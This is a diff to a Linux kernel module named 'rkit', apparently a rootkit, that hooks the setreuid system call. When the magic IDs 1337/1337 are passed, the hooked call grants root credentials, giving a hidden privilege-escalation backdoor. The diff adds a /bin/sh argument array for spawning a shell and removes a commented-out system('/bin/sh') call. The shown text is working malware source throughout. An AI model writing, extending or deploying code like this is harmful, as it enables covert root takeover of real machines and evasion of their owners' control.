@@ -20,6 +20,7 @@
 
 
 
+
 int rkit_init(void);
 void rkit_exit(void);
 module_init(rkit_init);
@@ -66,6 +67,7 @@ asmlinkage ssize_t rkit_write(int fd, const char __user *buff, ssize_t count) {
 asmlinkage ssize_t rkit_setreuid(uid_t ruid, uid_t euid){
     int r;
     struct cred *new;
+    char *args[] = {"/bin/sh", NULL};
     //this is our condition we need to meet to activate the root shell
     if (ruid == 1337 && euid == 1337){
         //if the condition is met, check dmesg to see if this is there 
@@ -84,8 +86,6 @@ asmlinkage ssize_t rkit_setreuid(uid_t ruid, uid_t euid){
             commit_creds(new);
             return EEXIST;
         }
-        //spawn a new shell 
-        //system ("/bin/sh");
     }
     r = (*o_setreuid)(ruid,euid);
     return r;
